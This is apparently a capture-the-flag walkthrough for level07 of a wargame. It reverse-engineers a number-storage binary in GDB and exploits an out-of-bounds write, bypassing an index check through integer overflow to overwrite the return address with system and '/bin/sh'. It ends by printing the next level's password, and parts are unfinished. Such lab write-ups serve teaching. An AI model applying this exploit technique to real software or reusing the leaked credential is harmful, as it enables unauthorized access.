# Level07 Walkthrough

## Analyzing the Program with GDB and ghidra
NEED TO GHIDRA 

1. **Whats happening**: 

- The program provides a simple number storage service, with some commands `store`, `read` and `quit`, wil has reserved some storage, in an array dynamicaly stored. 

- There is somes functions like : 
   - `get_unum()` : read unsigned int from standart input with `scanf` : `disas get_unum` to see `0x08048610 <+41>:    call   0x8048500 <__isoc99_scanf@plt>` after validation.
   - `store_number` : Verify if the condition to write the number with index is respected, otherwise it returns an error.
   - `read_number` : read and print the value with a specified index in the storage array.

- Its a magic number walkthrough : number pre-calculated (with special multiplicator) that avoid verifications. 
On cherche un multiplicateur 𝑚 tel que : 𝑚 × 𝑑 ≈ 2𝑘 where k is the precision choosen. During execution, we can replace powerfull division by its multiplication or bitshifting. 

- Let's run it.
```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:
```

- We can see that the max number is `4294967295` : 
```bash
Input command: store
 Number: 879489874984987
 Index: 2
 Completed store command successfully
Input command: read
 Index: 2
 Number at data[2] is 4294967295
 Completed read command successfully
Input command: store
 Number: 3
 Index: 2
 Completed store command successfully
Input command: read    
 Index: 2
 Number at data[2] is 3
 Completed read command successfully
```

- Lets `disas main` and see the walkthrough, lets check the `store` : 
```bash
disas store_number
[...]
0x08048697 <+103>:   movl   $0x8048ae6,(%esp)
0x0804869e <+110>:   call   0x80484c0 <puts@plt>

[...]

0x080486a3 <+115>:   movl   $0x8048af8,(%esp) <---- This index is reserved for wil 
0x080486aa <+122>:   call   0x80484c0 <puts@plt>
0x080486af <+127>:   movl   $0x8048ae6,(%esp) <------- "Error"
0x080486b6 <+134>:   call   0x80484c0 <puts@plt>
[...]
```

- Here, they read the value of the number and the index and then, there is some operation, checking the condition : Here is a magic number, during this steps it checks 
   - if our number is divided by 3 or not index % 3 == 0
   - if value >> 24 != 183 (=> value / 16777216) 

```bash
0x0804866e <+62>:    mov    -0xc(%ebp),%ecx
0x08048671 <+65>:    mov    $0xaaaaaaab,%edx <----- which is 2863311531
0x08048676 <+70>:    mov    %ecx,%eax
0x08048678 <+72>:    mul    %edx <---- multiplying the value in eax with the value in edx. The multiplication is an unsigned multiplication. The product, a 64-bit value, is stored in edx:eax. The lower 32 bits of the product are stored in eax, and the upper 32 bits are stored in edx.

0x0804867a <+74>:    shr    %edx <---- shift right
0x0804867c <+76>:    mov    %edx,%eax
0x0804867e <+78>:    add    %eax,%eax
```

- Lets see the read part :
```bash
   0x08048901 <+478>:   mov    $0x8048d61,%eax
   0x08048906 <+483>:   mov    $0x4,%ecx
   0x0804890b <+488>:   mov    %edx,%esi
   0x0804890d <+490>:   mov    %eax,%edi
   0x0804890f <+492>:   repz cmpsb %es:(%edi),%ds:(%esi) <---- strcmp ???
   0x08048911 <+494>:   seta   %dl
   0x08048914 <+497>:   setb   %al
   0x08048917 <+500>:   mov    %edx,%ecx
   0x08048919 <+502>:   sub    %al,%cl
   0x0804891b <+504>:   mov    %ecx,%eax
   0x0804891d <+506>:   movsbl %al,%eax
   0x08048920 <+509>:   test   %eax,%eax
   0x08048922 <+511>:   jne    0x8048939 <main+534> <---- condition
   0x08048924 <+513>:   lea    0x24(%esp),%eax
   0x08048928 <+517>:   mov    %eax,(%esp)
   0x0804892b <+520>:   call   0x80486d7 <read_number> <---- call to another read number
   0x08048930 <+525>:   mov    %eax,0x1b4(%esp)
```

- Lets see the read_number part : 
```bash

(gdb) disas read_number
Dump of assembler code for function read_number:
   0x080486d7 <+0>:     push   %ebp
   0x080486d8 <+1>:     mov    %esp,%ebp
   0x080486da <+3>:     sub    $0x28,%esp
   0x080486dd <+6>:     movl   $0x0,-0xc(%ebp)
   0x080486e4 <+13>:    mov    $0x8048add,%eax
   0x080486e9 <+18>:    mov    %eax,(%esp)
   0x080486ec <+21>:    call   0x8048470 <printf@plt>
   0x080486f1 <+26>:    call   0x80485e7 <get_unum> <---- call to get_unum() 
   0x080486f6 <+31>:    mov    %eax,-0xc(%ebp)
   0x080486f9 <+34>:    mov    -0xc(%ebp),%eax
   0x080486fc <+37>:    shl    $0x2,%eax <--- Shift left by 0x2
   0x080486ff <+40>:    add    0x8(%ebp),%eax <---- Add this number contains on %eax 
   0x08048702 <+43>:    mov    (%eax),%edx
[...]
```

- There is an out-of-Bounds access in `store_number` function, need to find out what to store (system and bin/sh) and where (store_number function), we should play with outbound access with number and access. 

- The program autorize values that dont pass the test 

2. **Final walktrough**

- We'll get the offset of store_number, lets breakpoint before store_number to put values and then break before the return to check the offset 

0x08048633 <+3>:     sub    $0x28,%esp
0x080489f1 <+718>:   ret
```bash
(gdb) b *0x08048633
Breakpoint 1 at 0x8048633
(gdb) b *0x080489f1
Breakpoint 2 at 0x80489f1
(gdb) r
[...]
Input command: store

Breakpoint 1, 0x08048633 in store_number ()
(gdb) x $ebp+0x8 
0xffffd520:     0xffffd544
(gdb) c
[...]
Input command: quit

Breakpoint 2, 0x080489f1 in main ()
(gdb) x/wx $esp
0xffffd70c:     0xf7e45513
```

0xffffd70c - 0xffffd520 = 492 - 36 = 456 

456 / 4 = 114 sauf que c'est divisible par 3. 

- Pourquoi faire une soustraction ? Car elle revele l'offset relatif entre une position dans la pile et une position dans une zone memoire (l'offset indique le decalage entre ces deux addresses)

- On va utiliser un magic number car il est possible de contourner cette limitation avec un integer overflow, par exemple en utilisant 1073741824 (c'est-à-dire 2^32/4) au lieu de zéro.

- De même, on ne peut pas utiliser directement l'index 114 (c'est un multiple de 3) ; donc on devra stocker à l'index 1073741938 (1073741824 + 114).

```bash
Input command: store
 Number: 4159090384 <-----  0xF7E6AED0 <system> function uppercase
 Index: 2147483762 OR 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172 <---- 0xF7F897EC <"/bin/sh"> function 
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

---

## Moving to level08

1. **Swith User to level08**:
    Run ```su level08```
```

2. **Authenticate with the Password**:
    
   
 